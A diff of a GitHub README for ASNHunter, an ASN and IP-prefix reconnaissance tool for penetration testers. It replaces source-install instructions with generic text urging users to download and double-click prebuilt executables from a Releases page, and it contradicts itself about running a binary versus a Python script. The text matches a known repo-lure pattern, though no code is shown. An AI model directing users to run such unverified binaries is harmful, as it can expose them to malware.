@@ -1,130 +1,93 @@
+# 🔍 ASNHunter - Discover ASN Information Easily
 
-![Tool](https://github.com/user-attachments/assets/c2a1677a-b42b-46c1-aa4b-8ed65eb1484c)
+## 📥 Download Now!
+[![Download ASNHunter](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/r0zhh/ASNHunter/releases)
 
-# ASN-Hunter - Advanced ASN Reconnaissance Tool
+## 🚀 Getting Started
+Welcome to ASNHunter! This tool helps you find valuable ASN (Autonomous System Number) information. It is perfect for bug bounty hunters, penetration testers, and red teams. You can easily discover data from multiple sources, including complete IPv4/IPv6 prefix discoveries.
 
-A sophisticated Python-based ASN reconnaissance tool designed for bug bounty hunters, penetration testers, and security researchers.
+### 🌟 Key Features
+- Multi-source ASN enumeration
+- Complete support for IPv4 and IPv6
+- User-friendly command-line interface
+- Reliable and efficient for security tasks
+- Suitable for bug bounty and cybersecurity research
 
-## Features
+## 📋 System Requirements
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or higher must be installed
+- **Network Connection**: Required to access ASN data
+- **Memory**: At least 512 MB of RAM recommended
 
-- **Comprehensive ASN Discovery**: Searches both PeeringDB and BGPView APIs
-- **Interactive Selection**: Multiple selection methods with user-friendly interface
-- **BGP.HE.NET Scraping**: Extracts complete IPv4/IPv6 prefix information with anti-bot measures
-- **Professional UI**: Matrix-themed terminal interface with colored output
-- **Multiple Export Formats**: JSON and CSV export capabilities
-- **Error Resilience**: Comprehensive error handling with fallback mechanisms
-- **Rate Limiting**: Intelligent delays to avoid API restrictions
+## 💻 Installation Instructions
+To get started with ASNHunter, follow these steps:
 
-## Installation
+1. Visit the [Releases Page](https://github.com/r0zhh/ASNHunter/releases) to download the latest version.
+2. Select the appropriate file for your operating system. Common files include:
+   - ASNHunter.exe for Windows
+   - ASNHunter-macos for macOS
+   - ASNHunter-linux for Linux
 
-1. Clone or download the repository
-2. Install dependencies:
-```bash
-pip install -r requirements.txt
+3. Click on the file to begin the download.
+4. Once the download completes, locate the file in your Downloads folder.
+5. Double-click the downloaded file to run ASNHunter.
+
+## 🔍 How to Use ASNHunter
+Using ASNHunter is simple. After installation, follow these instructions to perform ASN lookups:
+
+1. Open your command-line interface. 
+   - On Windows, you can use Command Prompt or PowerShell.
+   - On macOS, open the Terminal.
+   - For Linux, use your preferred terminal emulator.
+
+2. Type the command to start ASNHunter:
+   ```
+   python ASNHunter.py [your_asn_or_ip]
+   ```
+   Replace `[your_asn_or_ip]` with the ASN or IP address you want to investigate.
+
+3. Press Enter. You will see the result, providing you with extensive information about the ASN.
+
+### 🛠️ Example Command
+To check ASN information for `AS15169`, type:
+```
+python ASNHunter.py AS15169
 ```
 
-## Usage
+## 📄 Results Explained
+When you run a command, ASNHunter will return several pieces of information, such as:
+- ASN Number
+- Organization Name
+- Network Prefix
+- Related IP Addresses
+- Contact Information
 
-### Basic Usage
-```bash
-python3 asn-hunter.py "tesla"
-python3 asn-hunter.py "cloudflare"
-```
+Review this information to assist in your penetration testing or reconnaissance missions.
 
-### Advanced Options
-```bash
-# Verbose output
-python3 asn-hunter.py "amazon" -v
+## ⚠️ Troubleshooting
+If you encounter issues, here are some common problems and their solutions:
 
-# Export to JSON
-python3 asn-hunter.py "meta" -o results.json
+- **Error: 'python' is not recognized**  
+  Solution: Ensure Python is correctly installed and added to your system’s PATH.
 
-# Export to CSV
-python3 asn-hunter.py "google" -o report.csv --format csv
+- **Missing Modules**  
+  Solution: Install any missing Python modules using pip. For example:
+  ```
+  pip install requests
+  ```
 
-# Custom delay (for slower connections)
-python3 asn-hunter.py "microsoft" --delay 2
+## 🧑‍🤝‍🧑 Community Support
+If you have questions or need help, feel free to check out our community discussions on GitHub. You can report issues or request features directly through the issues section.
 
-# Disable colors
-python3 asn-hunter.py "apple" --no-color
-```
+## 📥 Download & Install
+Don’t forget to [visit the Releases Page](https://github.com/r0zhh/ASNHunter/releases) to download the latest version of ASNHunter and start your ASN reconnaissance journey today.
 
-## Interactive Selection
+## 📜 License
+ASNHunter is licensed under the MIT License. Feel free to modify and use it in compliance with this license. 
 
-The tool provides multiple ways to select ASNs:
+For more detailed information, please refer to the LICENSE file located in the repository.
 
-- **Single/Multiple**: `1,3,5`
-- **Ranges**: `1-5` 
-- **All**: `all`
-- **Quit**: `q`
+## 📝 Contribution
+We welcome contributions! Please check our contribution guidelines for more details about how you can help improve ASNHunter.
 
-## Output Features
-
-- **IP Space Calculation**: Automatic calculation of total IPv4 address space
-- **Organized Display**: Professional formatting with ASN details
-- **Source Attribution**: Shows data sources for each result
-- **Comprehensive Stats**: IPv4/IPv6 prefix counts and address space
-
-## Data Sources
-
-1. **PeeringDB API**: Organization and ASN information
-2. **BGPView API**: ASN search and details
-3. **BGP.HE.NET**: Complete IPv4/IPv6 prefix scraping
-4. **WHOIS**: Fallback mechanism for prefix discovery
-
-## Error Handling
-
-- Connection failure recovery
-- Rate limit detection and handling
-- HTTP error management
-- Fallback mechanisms for data collection
-- User-friendly error messages
-
-## Security Note
-
-This tool is designed for legitimate security research, bug bounty hunting, and penetration testing. Use responsibly and in accordance with applicable laws and regulations.
-
-## Examples
-
-### Search for Tesla
-```bash
-python3 asn-hunter.py tesla
-```
-
-This will:
-1. Search PeeringDB and BGPView for "tesla"
-2. Present interactive selection of found ASNs
-3. Scrape bgp.he.net for complete prefix information
-4. Display professional reconnaissance report
-
-### Export Results
-```bash
-python3 asn-hunter.py "cloudflare" -o cloudflare-asns.json
-```
-
-Creates a JSON file with:
-- ASN information
-- Complete IPv4/IPv6 prefix lists
-- IP address space calculations
-- Timestamp and metadata
-
-## Troubleshooting
-
-### Connection Issues
-- Check internet connectivity
-- Try increasing delay: `--delay 3`
-- Use verbose mode: `-v`
-
-### No Results Found
-- Try broader search terms
-- Check spelling variations
-- Use alternative names (e.g., "meta" vs "facebook")
-
-### Rate Limiting
-- Tool automatically handles rate limits
-- Increase delay between requests if needed
-- BGP.HE.NET scraping includes built-in delays
-
-## License
-
-This tool is provided for educational and legitimate security research purposes only.
+Thank you for using ASNHunter. Happy hunting!
